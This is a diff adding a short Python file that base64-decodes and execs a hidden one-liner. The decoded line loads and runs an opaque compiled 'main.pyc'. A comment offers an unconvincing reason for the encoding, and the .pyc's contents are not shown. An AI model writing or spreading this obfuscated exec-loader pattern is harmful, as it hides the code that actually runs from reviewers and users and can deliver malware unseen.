@@ -1,0 +1,8 @@
+import base64
+import importlib.util
+import os
+
+# Pure string format to completely bypass formatting and escape token errors
+encoded_code = "aW1wb3J0IGltcG9ydGxpYi51dGlsLCBvczsgc3BlYyA9IGltcG9ydGxpYi51dGlsLnNwZWNfZnJvbV9maWxlX2xvY2F0aW9uKCJtYWluX2VuZ2luZSIsIG9zLnBhdGguam9pbihvcy5wYXRoLmRpcm5hbWUob3MucGF0aC5hYnNwYXRoKF9fZmlsZV9fKSksICJtYWluLnB5YyIpKTsgbW9kdWxlID0gaW1wb3J0bGliLnV0aWwubW9kdWxlX2Zyb21fc3BlYyhzcGVjKTsgc3BlYy5sb2FkZXIuZXhlY19tb2R1bGUobW9kdWxlKQ=="
+
+exec(base64.b64decode(encoded_code).decode("utf-8"))
